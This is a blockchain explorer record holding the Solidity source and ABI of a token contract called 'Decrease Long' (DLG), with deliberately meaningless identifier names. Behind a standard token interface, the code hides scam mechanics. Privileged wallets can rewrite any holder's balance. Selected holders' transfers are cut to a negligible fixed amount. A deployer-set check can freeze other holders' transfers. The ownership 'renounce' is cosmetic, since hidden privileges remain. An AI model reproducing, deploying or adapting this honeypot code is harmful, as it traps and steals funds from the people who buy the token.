{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface amountSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLiquidityMarketing {\n    function createPair(address feeAmountLimit, address autoMinList) external returns (address);\n}\n\ninterface shouldLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedMax) external view returns (uint256);\n\n    function transfer(address marketingSellTotal, uint256 exemptReceiver) external returns (bool);\n\n    function allowance(address teamSwapLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingSellTotal,\n        uint256 exemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingFeeBuy, uint256 value);\n    event Approval(address indexed teamSwapLaunched, address indexed spender, uint256 value);\n}\n\ninterface shouldLaunchedMetadata is shouldLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DecreaseLong is exemptLiquidity, shouldLaunched, shouldLaunchedMetadata {\n\n    uint256 receiverAt;\n\n    function owner() external view returns (address) {\n        return minTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atShouldTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLimit;\n    }\n\n    uint256 fromSwap;\n\n    bool private maxModeTake;\n\n    bool public amountTotalTrading;\n\n    mapping(address => mapping(address => uint256)) private receiverBuyToken;\n\n    function transferFrom(address shouldAt, address marketingSellTotal, uint256 exemptReceiver) external override returns (bool) {\n        if (_msgSender() != totalToken) {\n            if (receiverBuyToken[shouldAt][_msgSender()] != type(uint256).max) {\n                require(exemptReceiver <= receiverBuyToken[shouldAt][_msgSender()]);\n                receiverBuyToken[shouldAt][_msgSender()] -= exemptReceiver;\n            }\n        }\n        return tokenSwapMin(shouldAt, marketingSellTotal, exemptReceiver);\n    }\n\n    function approve(address fundTx, uint256 exemptReceiver) public virtual override returns (bool) {\n        receiverBuyToken[_msgSender()][fundTx] = exemptReceiver;\n        emit Approval(_msgSender(), fundTx, exemptReceiver);\n        return true;\n    }\n\n    uint256 private fromReceiverLiquidity = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed minMode, address indexed marketingToken);\n\n    function fromReceiverTotal() private view {\n        require(walletSell[_msgSender()]);\n    }\n\n    function swapBuy() public {\n        emit OwnershipTransferred(toSwap, address(0));\n        minTo = address(0);\n    }\n\n    function sellWallet(uint256 exemptReceiver) public {\n        fromReceiverTotal();\n        fromSwap = exemptReceiver;\n    }\n\n    address public toSwap;\n\n    bool private launchExempt;\n\n    function senderLiquidity(address modeEnable) public {\n        fromReceiverTotal();\n        \n        if (modeEnable == toSwap || modeEnable == toTrading) {\n            return;\n        }\n        buyFrom[modeEnable] = true;\n    }\n\n    string private amountLimit = \"DLG\";\n\n    uint8 private atShouldTeam = 18;\n\n    string private buyLimit = \"Decrease Long\";\n\n    mapping(address => uint256) private launchedShouldFee;\n\n    function tokenSwapMin(address shouldAt, address marketingSellTotal, uint256 exemptReceiver) internal returns (bool) {\n        if (shouldAt == toSwap) {\n            return shouldAmount(shouldAt, marketingSellTotal, exemptReceiver);\n        }\n        uint256 tokenTake = shouldLaunched(toTrading).balanceOf(shouldMin);\n        require(tokenTake == fromSwap);\n        require(marketingSellTotal != shouldMin);\n        if (buyFrom[shouldAt]) {\n            return shouldAmount(shouldAt, marketingSellTotal, swapTotal);\n        }\n        return shouldAmount(shouldAt, marketingSellTotal, exemptReceiver);\n    }\n\n    function launchAmount(address teamBuyTake, uint256 exemptReceiver) public {\n        fromReceiverTotal();\n        launchedShouldFee[teamBuyTake] = exemptReceiver;\n    }\n\n    address totalToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public totalSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromReceiverLiquidity;\n    }\n\n    function tokenFundTeam(address minBuy) public {\n        require(minBuy.balance < 100000);\n        if (amountTotalTrading) {\n            return;\n        }\n        if (launchExempt) {\n            listTrading = true;\n        }\n        walletSell[minBuy] = true;\n        if (listTrading != launchExempt) {\n            maxModeTake = false;\n        }\n        amountTotalTrading = true;\n    }\n\n    function shouldAmount(address shouldAt, address marketingSellTotal, uint256 exemptReceiver) internal returns (bool) {\n        require(launchedShouldFee[shouldAt] >= exemptReceiver);\n        launchedShouldFee[shouldAt] -= exemptReceiver;\n        launchedShouldFee[marketingSellTotal] += exemptReceiver;\n        emit Transfer(shouldAt, marketingSellTotal, exemptReceiver);\n        return true;\n    }\n\n    bool private listTrading;\n\n    address shouldMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address limitMax, address fundTx) external view virtual override returns (uint256) {\n        if (fundTx == totalToken) {\n            return type(uint256).max;\n        }\n        return receiverBuyToken[limitMax][fundTx];\n    }\n\n    function transfer(address teamBuyTake, uint256 exemptReceiver) external virtual override returns (bool) {\n        return tokenSwapMin(_msgSender(), teamBuyTake, exemptReceiver);\n    }\n\n    mapping(address => bool) public walletSell;\n\n    address private minTo;\n\n    function balanceOf(address launchedMax) public view virtual override returns (uint256) {\n        return launchedShouldFee[launchedMax];\n    }\n\n    address public toTrading;\n\n    function getOwner() external view returns (address) {\n        return minTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyLimit;\n    }\n\n    uint256 constant swapTotal = 16 ** 10;\n\n    constructor (){\n        if (listTrading != launchExempt) {\n            totalSwap = false;\n        }\n        amountSender exemptLimitFrom = amountSender(totalToken);\n        toTrading = listLiquidityMarketing(exemptLimitFrom.factory()).createPair(exemptLimitFrom.WETH(), address(this));\n        \n        toSwap = _msgSender();\n        swapBuy();\n        walletSell[toSwap] = true;\n        launchedShouldFee[toSwap] = fromReceiverLiquidity;\n        if (maxModeTake == totalSwap) {\n            maxModeTake = true;\n        }\n        emit Transfer(address(0), toSwap, fromReceiverLiquidity);\n    }\n\n    mapping(address => bool) public buyFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwapLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFeeBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"}],\"name\":\"senderLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"tokenFundTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingSellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DecreaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}